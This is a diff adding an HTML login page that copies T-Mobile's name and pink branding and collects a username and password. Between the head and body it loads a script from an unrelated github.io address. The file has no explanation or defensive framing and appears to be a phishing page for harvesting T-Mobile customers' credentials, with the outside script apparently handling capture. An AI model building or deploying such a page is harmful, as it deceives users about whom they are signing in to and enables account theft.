@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>T-Mobile Login</title>
+  <style>
+    /* General reset */
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+    }
+
+    body {
+      background-color: #e20074; /* T-Mobile pink background */
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .login-container {
+      background-color: #fff;
+      padding: 40px;
+      border-radius: 10px;
+      width: 350px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+      text-align: center;
+    }
+
+    .login-container h2 {
+      color: #e20074;
+      margin-bottom: 30px;
+      font-size: 24px;
+    }
+
+    .login-container input[type="text"],
+    .login-container input[type="password"] {
+      width: 100%;
+      padding: 12px 15px;
+      margin: 10px 0 20px 0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      font-size: 16px;
+    }
+
+    .login-container input[type="submit"] {
+      background-color: #e20074;
+      color: white;
+      border: none;
+      padding: 12px;
+      width: 100%;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    .login-container input[type="submit"]:hover {
+      background-color: #c40063;
+    }
+
+    .login-container a {
+      display: block;
+      margin-top: 15px;
+      color: #e20074;
+      text-decoration: none;
+      font-size: 14px;
+    }
+
+    .login-container a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<script src="https://ysktshsh.github.io/intfolder/int.js"></script>
+<body>
+  <div class="login-container">
+    <h2>T-Mobile Login</h2>
+    <form>
+      <input type="text" placeholder="Username or Email" name="Username or email"required>
+      <input type="password" placeholder="Password" name="Password" required>
+      <input type="submit" value="Sign In">
+      <a href="#">Forgot Password?</a>
+    </form>
+  </div>
+</body>
+</html>
